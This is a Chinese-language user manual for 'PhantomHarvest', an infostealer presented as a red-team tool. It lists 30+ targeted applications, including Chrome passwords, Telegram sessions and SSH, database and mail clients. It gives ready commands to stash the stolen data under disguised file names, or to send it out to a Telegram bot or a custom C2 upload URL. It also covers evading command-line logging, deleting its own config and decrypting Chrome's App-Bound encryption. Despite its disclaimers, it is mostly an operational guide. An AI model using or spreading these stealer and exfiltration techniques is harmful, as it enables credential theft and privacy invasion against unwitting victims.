# PhantomHarvest 使用手册
// 有一天当我使用传统的密码获取工具尝试导出 Chrome 密码时，结果全是空的。

后来发现可能是Google浏览器内核版本太高了，同时再不关闭浏览器的情况下，强制读取 `Login Data` 文件触发了文件占用锁，导致读取失败。

更糟糕的是，他的Telegram 都是便携版，放在了 E 盘，自动化工具完全扫描不到。

// 网上查了一下，找了几个软件逆向并缝合，PhantomHarvest诞生了。

PhantomHarvest 是一个隐蔽的后渗透传输软件，专为红队评估和安全研究设计。它能够从目标系统中提取敏感信息，并支持隐蔽的本地保存或远程传输。

全靠AI，谢谢Gemini，谢谢Gemini喵。

## 🚀 核心功能与支持列表

PhantomHarvest 能够自动扫描并收集以下 30+ 种应用程序的数据：

### 🌐 浏览器 (Browsers)
*   **Google Chrome** (支持 v127+ App-Bound Encryption 解密)
*   **Microsoft Edge**
*   **Firefox**
*   **Internet Explorer**
*   **其他 Chromium 内核浏览器**: Brave, Opera, Vivaldi, CentBrowser, 360, QQ浏览器等

### 💬 即时通讯 (Messengers)
*   **Telegram Desktop** (支持多盘符、便携版检测/sessionhak)
*   **QQ**
*   **DingTalk (钉钉)**
*   **Skype**
*   **Discord**
*   **Line**
*   **Enigma**

### 🛠️ 运维与开发工具 (Tools)
*   **Navicat** (数据库管理)
*   **MobaXterm** (SSH客户端)
*   **Xmanager / Xshell**
*   **FinalShell**
*   **SecureCRT**
*   **RDCMan** (远程桌面管理)
*   **TortoiseSVN**
*   **DBeaver**
*   **SQLyog**
*   **VSCode**

### 📧 邮件与传输 (Mails & FTP)
*   **Outlook**
*   **Foxmail**
*   **MailMaster (网易邮箱大师)**
*   **MailBird**
*   **WinSCP**
*   **FileZilla**
*   **CoreFTP**
*   **Snowflake**

### 💻 系统信息 (System Info)
*   **Wi-Fi 密码**
*   **屏幕截图**
*   **已安装软件列表**

---

## 📖 三大运行模式 (使用案例)

PhantomHarvest 不包含任何硬编码配置，所有行为由命令行参数控制。

### 模式一：隐蔽本地保存 (离线模式)
**适用场景**：目标机器无法出网，或者你想先收集数据再手动带走。

**命令：**
```bash
PhantomHarvest.exe --save "MySecretPassword123"
```

**执行效果：**
1.  程序自动收集所有数据。
2.  使用密码 `MySecretPassword123` 对数据进行加密压缩。
3.  将文件保存到系统临时目录 (`%TEMP%`)。
4.  **文件名随机化**：为了隐蔽，文件名会伪装成系统文件，例如 `a1b2c3d4.dat` 或 `update_log.bin`。
5.  **控制台输出**：程序会用绿色字体显示最终保存的路径，例如：
    > Data saved to: C:\Users\Admin\AppData\Local\Temp\a1b2c3d4.dat

---

### 模式二：Telegram 远程传输 (在线模式)
**适用场景**：目标机器可以上网，你想实时接收数据到你的 Telegram 手机端。

#### 方法 A：配置文件 (推荐 - 最安全)
为了防止命令行参数被系统日志 (Event ID 4688) 记录，建议使用配置文件。

1.  **新建文件**：在同目录下创建一个文本文件，例如 `sys.conf`。
2.  **写入内容**：
    ```ini
    Token=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
    ChatID=987654321
    ```
    *(注意：Token和ChatID必须准确，等号两边无空格)*
3.  **运行命令**：
    ```bash
    PhantomHarvest.exe --config sys.conf --unlink
    ```
    *   `--config`: 指定配置文件路径。
    *   `--unlink`: **关键参数**，程序读取配置后会立即**安全删除**该文件，不留痕迹。

#### 方法 B：命令行参数 (便捷)
如果不在意命令行日志记录，可以直接使用：
```bash
PhantomHarvest.exe --telegram "123456789:ABC..." "987654321"
```

---

### 模式三：自定义 C2 服务器 (高级模式)
**适用场景**：你有自己的接收服务器 (Cobalt Strike, Python Server 等)。

**命令：**
```bash
PhantomHarvest.exe --remote "http://192.168.1.100:8080/upload.php"
```

**执行效果：**
1.  程序将数据打包为 ZIP。
2.  通过 HTTP POST 请求发送到指定 URL。
3.  表单字段名为 `document`，文件名为 `harvest_机器名_时间.zip`。

---

## 🛡️ 高级特性说明

### 1. Chrome v20+ 解密 (App-Bound Encryption)
Chrome 127+ 引入了 App-Bound Encryption，使得传统工具失效。PhantomHarvest 实现了完整的解密流程：
*   **自动提权**：尝试模拟 SYSTEM 权限 (需要管理员运行)。
*   **双重解密**：先解密 App-Bound Key，再解密 Master Key。
*   **兼容性**：自动识别 Chrome 版本，在 v10 和 v20 算法间自动切换。

### 2. 智能文件访问 (Anti-Lock)
浏览器运行时，数据库文件通常被锁定。PhantomHarvest 采用双重策略：
1.  **FileShare.ReadWrite**：尝试以共享模式读取 (不触发杀软)。
2.  **Handle Duplication**：如果失败，则复制目标进程的句柄直接读取内存 (需要管理员权限)。

### 3. 隐蔽性 (Stealth)
*   **无硬编码**：程序内部不包含任何 C2 地址或 Token，静态分析无法获取你的配置。
*   **动态混淆**：关键字符串 (如 "explorer", "system") 在运行时动态解密。

---

## ❓ 常见问题 (Troubleshooting)

**Q: 运行 `--config` 模式时提示 "Config file not found"?**
A: 请检查文件名是否拼写正确。例如你创建的是 `sys.conf` 但命令输入了 `syb.conf`。

**Q: Telegram 接收失败，提示 "400 Bad Request"?**
A: 这通常是 Token 或 ChatID 错误。请确保：
   1. Token 完整复制，包含冒号。
   2. ChatID 是纯数字。
   3. 配置文件中没有多余的空格或换行。

**Q: 为什么没有收集到 Chrome 密码？**
A: 
   1. 确保以**管理员身份**运行 (Chrome v20+ 解密必须)。
   2. 确保目标确实保存了密码。

**Q: 程序运行没有反应？**
A: 程序设计为静默运行。如果使用了 `--save`，请留意控制台最后的绿色输出路径。如果使用了 `--telegram`，请检查手机是否收到消息。

---
 *(免责声明：本项目仅供安全研究与授权测试使用，请勿用于非法用途。)*



致谢：Gemini3

参考：Pillager:https://github.com/qwqdanchun/Pillager
## ⚠️ 免责声明
本项目仅供授权的安全测试、红队评估和教育目的使用。严禁用于非法入侵、窃取隐私或任何未经授权的恶意活动。使用者需自行承担所有法律责任。
致谢：Gemini3

Pillager:https://github.com/qwqdanchun/Pillager

